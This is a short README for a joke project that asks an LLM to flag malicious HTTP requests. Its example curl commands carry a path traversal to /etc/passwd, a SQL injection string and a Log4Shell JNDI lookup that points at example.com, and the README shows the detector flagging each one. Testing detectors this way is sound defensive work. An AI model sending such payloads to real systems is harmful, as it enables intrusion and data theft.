# badrat

We all know LLMs are 100% reliable so let's have it check if a HTTP request is potentially malicious or not.

## Development

Make sure `GROQ_API_KEY` is set, and then:

```sh
# In one shell
make dev-fastapi

# In another shell
make dev-baml
```

Now you can send requests to check how malicious they are:
```sh
curl -s http://localhost:8000/slim?path=../../ | jq
# {
#   "possibly_dangerous": true
# }

curl -s http://localhost:8000/complete?path=../../../etc/passwd&user=admin&password=letmein \
    -H "Authorization: Bearer Robert'); DROP TABLE students; --" \
    -H "Cookie: session_id=1234567890abcdef; expires=Fri, 31-Dec-9999 23:59:59 GMT" \
    -H "X-API-KEY: topsecretkey" \
    -H "Referer: https://example.com/malicious-referrer" \
    -H 'User-Agent: ${jndi:ldap://example.com/malicious-payload}' \
    | jq
# {
#     "possibly_dangerous": true,
#     "dangerous_parameters": [
#     {
#         "parameter_path": "url.query.path",
#         "value": "../../../etc/passwd"
#     },
#     {
#         "parameter_path": "headers.authorization",
#         "value": "Bearer Robert'); DROP TABLE students; --"
#     },
#     {
#         "parameter_path": "headers.user-agent",
#         "value": "${jndi:ldap://example.com/malicious-payload}"
#     }
#     ]
# }
```
